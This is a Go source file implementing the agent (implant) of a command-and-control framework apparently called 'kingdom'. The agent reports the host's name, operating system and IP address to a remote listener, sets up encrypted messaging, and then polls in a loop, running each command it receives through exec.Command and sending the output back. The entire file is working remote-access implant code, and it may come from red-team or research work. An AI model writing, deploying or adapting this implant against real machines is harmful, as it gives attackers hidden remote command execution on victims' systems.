package agents

import (
	"bytes"
	b64 "encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	comms "kingdom/internal/comms"
	commstypes "kingdom/internal/comms/comms_types"
)

type Agent struct {
	clientID string
	agentID  string
	baseURL  string

	key []byte
	iv  []byte

	http *http.Client
}

func New(baseURL, clientID, agentID string) *Agent {
	return &Agent{
		clientID: clientID,
		agentID:  agentID,
		baseURL:  strings.TrimRight(baseURL, "/"),
		http:     &http.Client{Timeout: 30 * time.Second},
	}
}

func (a *Agent) Run() error {
	tmpKey, tmpIV, _ := comms.GenerateTempKeyAndIV(a.clientID, a.agentID)
	reg := &commstypes.Request{
		AgentID:  a.agentID,
		Hostname: hostname(),
		OS:       runtime.GOOS,
		IPAddr:   localIP(),
		Port:     0,
	}
	encReq, _, _, err := comms.Encode(reg, tmpKey, tmpIV)
	if err != nil {
		return err
	}
	rawResp, err := a.post(encReq)
	if err != nil {
		return err
	}
	task, err := comms.Decode[*commstypes.Task](rawResp, tmpKey, tmpIV)
	if err != nil {
		return err
	}

	for {
		result := a.execute(task)

		if strings.EqualFold(task.Command, "noop") {
			time.Sleep(5 * time.Second)
		}

		encRes, _, _, err := comms.Encode(result, a.key, a.iv)
		if err != nil {
			return err
		}
		raw, err := a.post(encRes)
		if err != nil {
			return err
		}

		var next *commstypes.Task
		if a.key != nil {
			next, err = comms.Decode[*commstypes.Task](raw, a.key, a.iv)
		} else {
			next, err = comms.Decode[*commstypes.Task](raw, tmpKey, tmpIV)
		}
		if err != nil {
			return err
		}
		task = next
	}
}

func (a *Agent) execute(t *commstypes.Task) *commstypes.TaskResult {
	res := &commstypes.TaskResult{
		AgentID: a.agentID,
		TaskID:  t.ID,
		Status:  "success",
	}

	switch strings.ToLower(t.Command) {
	case "init":
		parts := strings.SplitN(t.Args, ",", 2)
		if len(parts) != 2 {
			res.Status = "error"
			res.Error = "malformed init args"
			return res
		}
		a.key, _ = b64.StdEncoding.DecodeString(parts[0])
		a.iv, _ = b64.StdEncoding.DecodeString(parts[1])
		res.Output = "session initialised"

	case "noop":
		res.Output = "nop"

	default:
		out, err := execCmd(t.Command, t.Args)
		res.Output = out
		if err != nil {
			res.Status = "error"
			res.Error = err.Error()
		}
	}
	return res
}

func (a *Agent) post(data []byte) ([]byte, error) {
	url := fmt.Sprintf("%s/client/%s/%s", a.baseURL, a.clientID, a.agentID)
	resp, err := a.http.Post(url, "application/octet-stream", bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("listener http %d", resp.StatusCode)
	}
	return io.ReadAll(resp.Body)
}

func execCmd(cmdStr, argLine string) (string, error) {
	args := []string{}
	if argLine != "" {
		args = strings.Split(argLine, " ")
	}
	cmd := exec.Command(cmdStr, args...)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func hostname() string {
	h, _ := os.Hostname()
	return h
}

func localIP() string {
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "0.0.0.0"
}
